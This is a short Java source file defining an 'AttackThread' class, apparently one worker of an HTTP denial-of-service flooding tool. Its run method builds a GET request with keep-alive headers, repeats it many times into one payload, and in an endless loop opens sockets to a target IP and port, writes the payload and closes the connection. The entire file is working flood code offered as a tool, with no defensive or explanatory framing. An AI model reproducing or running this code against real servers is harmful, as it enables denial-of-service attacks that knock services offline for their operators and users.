
import java.io.OutputStream;
import java.net.Socket;

/**
 *
 * @author filippofinke
 */
public class AttackThread extends Thread {

    private int index;
    private String ip;
    private int port;
    private int count;

    public AttackThread(int index, String ip, int port, int count) {
        this.index = index;
        this.ip = ip;
        this.port = port;
        this.count = count;
    }

    @Override
    public void run() {
        String header = "GET / HTTP/1.1\r\n";
        header += "Host: " + ip + "\r\n";
        header += "Connection: keep-alive\r\n";
        header += "\r\n";
        String packet = header.repeat(count);
        byte[] bytes = packet.getBytes();
        
        try {
            while (!isInterrupted()) {
                Socket socket = new Socket(ip, port);
                socket.setKeepAlive(false);
                socket.setSendBufferSize(bytes.length);
                OutputStream out = socket.getOutputStream();
                out.write(bytes);
                out.flush();
                Count.increment(count);
                socket.close();
            }
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }
        System.out.println(getId() + " killed!");
    }

}
